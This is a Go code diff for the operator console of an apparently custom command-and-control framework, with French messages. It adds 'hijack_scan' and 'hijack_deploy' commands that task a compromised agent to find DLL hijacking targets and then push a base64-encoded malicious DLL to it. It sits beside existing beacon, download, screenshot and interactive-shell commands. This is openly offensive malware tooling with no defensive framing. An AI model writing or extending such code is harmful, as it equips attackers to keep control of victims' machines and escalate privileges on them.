@@ -26,6 +26,7 @@ package operator
 import (
 	"bufio"
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -173,6 +174,16 @@ func (c *Console) handleCommand(cmd string, args []string) error {
 			return fmt.Errorf("usage: download <remote_path>")
 		}
 		return c.cmdTask("download", args[0])
+	case "hijack_scan":
+		if c.ActiveAgent == "" {
+			return fmt.Errorf("aucun agent sélectionné")
+		}
+		return c.cmdTask("hijack_scan", "")
+	case "hijack_deploy":
+		if c.ActiveAgent == "" || len(args) == 0 {
+			return fmt.Errorf("usage: hijack_deploy <chemin_local_vers_dll>")
+		}
+		return c.cmdHijackDeploy(args[0])
 	case "screenshot":
 		if c.ActiveAgent == "" {
 			return fmt.Errorf("aucun agent sélectionné")
@@ -321,6 +332,19 @@ func (c *Console) cmdTask(taskType, payload string) error {
 	fmt.Printf("[+] Tâche %s créée [%s] — en attente du beacon...\n",
 		taskType, taskID)
 	return nil
+}
+
+// cmdHijackDeploy — lit une DLL locale, l'encode en base64 et l'envoie à l'agent
+func (c *Console) cmdHijackDeploy(dllPath string) error {
+	data, err := os.ReadFile(dllPath)
+	if err != nil {
+		return fmt.Errorf("impossible de lire la DLL locale: %v", err)
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(data)
+	
+	fmt.Printf("[*] Envoi de la DLL (%d bytes)...", len(data))
+	return c.cmdTask("hijack_deploy", encoded)
 }
 
 // cmdInteractive — mode shell pseudo-interactif
@@ -572,6 +596,8 @@ func (c *Console) printHelp() {
     tasks               Historique des tâches
     interactive         Mode shell pseudo-interactif (sleep 1s)
     kill                Terminer l'agent
+    hijack_scan         Rechercher des cibles de DLL hijacking
+    hijack_deploy <dll> Déployer une DLL malveillante
 
   Tips :
     - Les IDs peuvent être abrégés (8 premiers caractères)
